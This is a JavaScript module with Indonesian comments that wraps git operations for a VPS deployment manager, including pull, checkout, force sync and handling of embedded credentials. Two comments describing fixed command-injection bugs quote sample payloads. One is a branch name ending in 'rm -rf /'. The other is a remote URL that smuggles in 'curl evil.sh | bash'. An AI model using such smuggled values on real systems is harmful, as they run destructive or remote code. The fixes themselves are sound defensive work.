const shell = require('../utils/shell');

/**
 * PENTING soal user: semua operasi git di sini WAJIB jalan sebagai `deployUser`
 * (lewat shell.runAsUser), BUKAN sebagai user OS yang menjalankan vps-manager
 * (mis. "ubuntu"/"root"). Folder project di-chown ke deployUser (mis. "www")
 * pas clone, dan sejak Git 2.35.2 (fix CVE-2022-24765), git MENOLAK beroperasi
 * kalau owner folder repo beda dari user yang menjalankan perintah git ("detected
 * dubious ownership in repository") - kalau vps-manager dijalankan sebagai user
 * lain (umum banget, mis. lewat `ubuntu` atau `root`), semua command git yang
 * TIDAK lewat runAsUser bakal gagal dengan error itu, walau foldernya valid.
 */

function status(projectPath, deployUser) {
  const result = shell.runAsUser(deployUser, 'git status --short', { cwd: projectPath, silent: true });
  if (!result.ok) return { ok: false, errorMessage: result.errorMessage };

  const branchResult = shell.runAsUser(deployUser, 'git rev-parse --abbrev-ref HEAD', {
    cwd: projectPath,
    silent: true,
  });
  const branch = branchResult.ok ? branchResult.output.trim() : '-';

  // WAJIB fetch dulu sebelum hitung ahead/behind. `HEAD...@{u}` bandingin ke
  // remote-tracking ref LOKAL (mis. origin/main), yang cuma ke-update kalau
  // fetch/pull pernah dijalankan - tanpa ini, Ahead/Behind selalu keliatan
  // "sinkron" walau remote-nya udah punya commit baru, sampai user Pull
  // (yang di dalamnya emang ada fetch). Fetch gagal (mis. repo private tanpa
  // kredensial ke-embed) TIDAK dianggap error fatal - status file lokal (git
  // status --short) tetap valid, cuma ahead/behind-nya nggak bisa dipastikan.
  const fetchResult = shell.runAsUser(deployUser, 'git fetch --quiet', { cwd: projectPath, silent: true });

  let ahead = 0;
  let behind = 0;
  if (fetchResult.ok) {
    const behindAheadResult = shell.runAsUser(deployUser, 'git rev-list --left-right --count HEAD...@{u}', {
      cwd: projectPath,
      silent: true,
    });
    if (behindAheadResult.ok && behindAheadResult.output) {
      const [a, b] = behindAheadResult.output.trim().split(/\s+/).map(Number);
      ahead = a || 0;
      behind = b || 0;
    }
  }

  const changedFiles = result.output ? result.output.split('\n').filter(Boolean) : [];

  return {
    ok: true,
    branch,
    ahead,
    behind,
    isClean: changedFiles.length === 0,
    changedFiles,
    remoteCheckFailed: !fetchResult.ok,
  };
}

/**
 * Pull dengan token auto-embed TRANSIENT kalau remote origin belum punya
 * credential nempel (misal project didaftarin lewat "Import Project ke
 * Registry", bukan di-clone lewat tool ini). Token dipasang ke remote URL
 * cuma buat durasi `git pull` ini doang, abis itu (sukses maupun gagal)
 * langsung dibalikin ke URL bersih - biar nggak nyimpen token permanen di
 * git config kalau bukan itu cara project ini di-setup sebelumnya. Kalau
 * remote sudah ada credential (mis. dari clone/"Update Kredensial GitHub"),
 * dibiarkan apa adanya (nggak dioprek).
 */
function pull(projectPath, deployUser, account) {
  const remoteResult = shell.runAsUser(deployUser, 'git remote get-url origin', { cwd: projectPath, silent: true });
  const currentUrl = remoteResult.ok ? remoteResult.output.trim() : null;
  const hasCredentials = currentUrl && /^https:\/\/[^/@]+@/i.test(currentUrl);

  if (!currentUrl || hasCredentials || !account) {
    return shell.runAsUser(deployUser, 'git pull', { cwd: projectPath });
  }

  const authedUrl = buildAuthenticatedUrl(currentUrl, account);
  setRemoteUrl(projectPath, authedUrl, deployUser);
  const result = shell.runAsUser(deployUser, 'git pull', { cwd: projectPath });
  setRemoteUrl(projectPath, currentUrl, deployUser); // balikin ke URL bersih, sukses/gagal tetap dibalikin
  return result;
}

function getHead(projectPath, deployUser) {
  const result = shell.runAsUser(deployUser, 'git rev-parse HEAD', { cwd: projectPath, silent: true });
  return result.ok ? result.output.trim() : null;
}

/**
 * Ambil URL remote "origin" (sudah di-strip credential-nya). Sebelumnya
 * command ini dijalankan langsung dari mainMenu.js (shell.runAsUser),
 * dipindah ke sini supaya logic git jadi satu pintu - reusable dari
 * CLI/bot/web nanti, bukan cuma dari menu ini.
 */
function getRemoteUrl(projectPath, deployUser) {
  const result = shell.runAsUser(deployUser, 'git remote get-url origin', { cwd: projectPath, silent: true });
  return result.ok ? stripCredentials(result.output.trim()) : null;
}

/**
 * Daftar file yang berubah antara 2 commit. Dipakai setelah pull/checkout
 * buat deteksi otomatis: package.json berubah? prisma/schema.prisma berubah?
 * - biar wizard update bisa nyaranin default yang tepat (bukan cuma nanya
 * generik "mau jalanin X?" tanpa konteks).
 */
function diffNameOnly(projectPath, fromRef, toRef, deployUser) {
  if (!fromRef || !toRef || fromRef === toRef) return [];
  const result = shell.runAsUserArgs(deployUser, 'git', ['diff', '--name-only', fromRef, toRef], { cwd: projectPath, silent: true });
  if (!result.ok || !result.output) return [];
  return result.output.split('\n').filter(Boolean);
}

function listBranches(projectPath, deployUser) {
  const result = shell.runAsUser(deployUser, 'git branch -a --format="%(refname:short)"', {
    cwd: projectPath,
    silent: true,
  });
  if (!result.ok) return { ok: false, branches: [], error: result.errorMessage };
  return { ok: true, branches: result.output.split('\n').filter(Boolean) };
}

// FIXED (Fase 3.1): sebelumnya `branch`/`limit` disisipkan langsung ke string
// command via runAsUser() (shell interpolation) - branch seperti `main; rm -rf /`
// bisa eksekusi command tambahan. Sekarang pakai runAsUserArgs() (execFileSync,
// argv terpisah) - branch/limit dikirim sebagai argv literal, shell tidak
// pernah melihat/mem-parsing gabungan stringnya. Whitelist BRANCH_REGEX di
// git.routes.js tetap dipertahankan sebagai defense-in-depth, bukan lagi
// satu-satunya penutup celah.
function checkout(projectPath, branch, deployUser) {
  return shell.runAsUserArgs(deployUser, 'git', ['checkout', branch], { cwd: projectPath });
}

function log(projectPath, deployUser, limit = 10) {
  return shell.runAsUserArgs(deployUser, 'git', ['log', '--oneline', '-n', String(limit)], { cwd: projectPath, silent: true });
}

function stash(projectPath, deployUser) {
  return shell.runAsUser(deployUser, 'git stash', { cwd: projectPath });
}

/**
 * "Paksa Sync ke Remote" - buat keluar dari state yang GAK BISA diselesaikan
 * lewat pull() atau stash() biasa (mis. ada unmerged files/conflict dari
 * merge yang kepotong/gagal sebelumnya - `git pull` nolak duluan dengan
 * "Pulling is not possible because you have unmerged files", dan `git
 * stash` JUGA nolak kalau ada unmerged files, jadi user kejebak tanpa jalan
 * keluar). Ini nge-reset working tree PAKSA biar PERSIS sama remote branch -
 * ngebuang SEMUA perubahan lokal (baik yang lagi conflict maupun yang belum
 * di-commit), bukan cuma nyelesain conflict-nya doang. DESTRUKTIF by design:
 * cocok buat konteks deploy (project seharusnya emang gak ada edit manual di
 * server), makanya endpoint ini wajib ada konfirmasi eksplisit di sisi UI
 * sebelum dipanggil.
 */
function forceSyncToRemote(projectPath, deployUser) {
  const branchResult = shell.runAsUser(deployUser, 'git rev-parse --abbrev-ref HEAD', { cwd: projectPath, silent: true });
  if (!branchResult.ok) return { ok: false, errorMessage: `Gagal deteksi branch aktif: ${branchResult.errorMessage}` };
  const branch = branchResult.output.trim();

  // Merge yang lagi jalan (kalau ada) wajib di-abort DULU - `git reset --hard`
  // doang TIDAK otomatis membersihkan state MERGE_HEAD, bisa nyisain repo
  // dalam kondisi aneh (working tree bersih tapi Git masih "mikir" lagi
  // proses merge). Diabaikan kalau memang gak ada merge yang jalan (harmless).
  shell.runAsUser(deployUser, 'git merge --abort', { cwd: projectPath, silent: true });

  const fetchResult = shell.runAsUser(deployUser, 'git fetch --quiet', { cwd: projectPath });
  if (!fetchResult.ok) return { ok: false, errorMessage: `Gagal fetch dari remote: ${fetchResult.errorMessage}` };

  return shell.runAsUser(deployUser, `git reset --hard origin/${branch}`, { cwd: projectPath });
}

/**
 * Sisipkan username:token ke URL https GitHub, buat clone/pull repo private
 * tanpa nanya username/PAT tiap kali. Cuma disisipkan kalau URL-nya https://
 * (SSH URL / URL yang udah ada credential-nya sendiri dibiarkan apa adanya).
 */
function buildAuthenticatedUrl(url, account) {
  if (!account || !account.username || !account.token) return url;
  if (!/^https:\/\//i.test(url)) return url;
  if (/^https:\/\/[^/@]+@/i.test(url)) return url; // udah ada credential manual di URL-nya
  return url.replace(/^https:\/\//i, `https://${encodeURIComponent(account.username)}:${encodeURIComponent(account.token)}@`);
}

/**
 * Kebalikan buildAuthenticatedUrl() - buang username:token dari URL sebelum
 * ditampilkan ke layar atau disimpan ke registry/log, biar PAT nggak nyangkut
 * di tempat yang nggak semestinya (registry.json, riwayat konfirmasi, dll).
 */
function stripCredentials(url) {
  return url.replace(/^(https:\/\/)[^@/]+@/i, '$1');
}

/**
 * Update remote origin sebuah repo yang udah di-clone (dipakai kalau token lama
 * expired/direvoke, atau mau pindah akun GitHub buat repo yang sama).
 *
 * FIX (command injection): sebelumnya `url` ditempel ke string command lewat
 * template literal (`git remote set-url origin "${url}"`) terus dijalanin
 * lewat runAsUser() (sudo -u user bash -c '...'). Kutip GANDA di sekitar url
 * TIDAK melindungi dari bash -c yang mem-parsing ulang isinya - endpoint
 * POST /:name/credentials (manualUrl dari body request, TANPA whitelist
 * regex sama sekali) bisa kirim url kayak `https://x"; curl evil.sh | bash; #`
 * dan command tambahan itu BENERAN dieksekusi sebagai deployUser. Sekarang
 * pakai runAsUserArgs() (execFileSync, argv terpisah) - persis pola yang
 * sudah dipakai checkout()/log()/diffNameOnly() di file ini, url dikirim
 * sebagai satu argv literal, gak pernah lewat parsing shell sama sekali.
 */
function setRemoteUrl(projectPath, url, deployUser) {
  return shell.runAsUserArgs(deployUser, 'git', ['remote', 'set-url', 'origin', url], { cwd: projectPath });
}

module.exports = {
  status,
  pull,
  getHead,
  getRemoteUrl,
  diffNameOnly,
  listBranches,
  checkout,
  log,
  stash,
  forceSyncToRemote,
  buildAuthenticatedUrl,
  stripCredentials,
  setRemoteUrl,
};
